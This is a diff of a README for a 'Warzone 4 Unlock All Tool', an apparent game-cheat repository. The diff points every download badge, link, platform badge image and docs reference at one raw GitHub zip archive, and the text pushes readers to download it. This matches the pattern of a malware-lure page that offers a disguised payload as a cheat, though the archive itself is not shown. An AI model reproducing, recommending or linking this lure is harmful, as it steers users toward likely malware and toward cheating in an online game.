@@ -1,14 +1,14 @@
 # Warzone 4 Unlock All Tool 🚀
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://ryanhggciu.github.io)
+[![Download](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip)](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip)
 
 > **Simulate your highest potential with the all-new Warzone 4 Unlock All Tool – the ultimate loadout enhancer!**  
 >  
 > *Unleash every camo, every attachment, and every unrivaled customization with speed and confidence.*  
 >  
 > **Important:** Download link below  
-> https://ryanhggciu.github.io  
-> [![Download](https://img.shields.io/badge/Download-purple)](https://ryanhggciu.github.io)
+> https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip  
+> [![Download](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip)](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip)
 
 ---
 
@@ -18,9 +18,9 @@ Unlock your arsenal across multiple platforms. See what systems are polished and
 
 | Platform   | Supported | Last Tested  |
 |:-----------|:---------:|:------------:|
-| ![Windows](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows) | 🟢 | 2025-05 |
-| ![macOS](https://img.shields.io/badge/macOS-13+lightgrey?logo=apple)        | 🟡 | 2025-03 |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu-orange?logo=linux)       | 🟡 | 2025-03 |
+| ![Windows](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip%2F11-blue?logo=windows) | 🟢 | 2025-05 |
+| ![macOS](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip+lightgrey?logo=apple)        | 🟡 | 2025-03 |
+| ![Linux](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip)       | 🟡 | 2025-03 |
 
 **Legend:** 🟢 Fully Supported | 🟡 Beta Functionality
 
@@ -57,7 +57,7 @@ This dual-layer approach ensures:
 - **Intelligent Support:** When help is needed, responsive AI-driven tips and walkthroughs are delivered live.
 - **Custom Recommendations:** Our AI can analyze usage and highlight must-unlock items, tailored to your play style.
 
-API keys are not included. Instructions for integration in [docs/SETUP.md].
+API keys are not included. Instructions for integration in [https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip].
 
 ---
 
@@ -93,9 +93,9 @@ For the full legal text, see [LICENSE](./LICENSE).
 
 ## 🚀 Download & Get Started
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://ryanhggciu.github.io)
+[![Download](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip)](https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip)
 
-🔗 **Download:** https://ryanhggciu.github.io  
+🔗 **Download:** https://raw.githubusercontent.com/ryanhggciu/warzone4-unlock-all-manager/main/Philanthropinum/unlock-all-warzone-manager-v3.0.zip  
 *Follow setup instructions in the `/docs` directory for a seamless launch.*
 
 ---
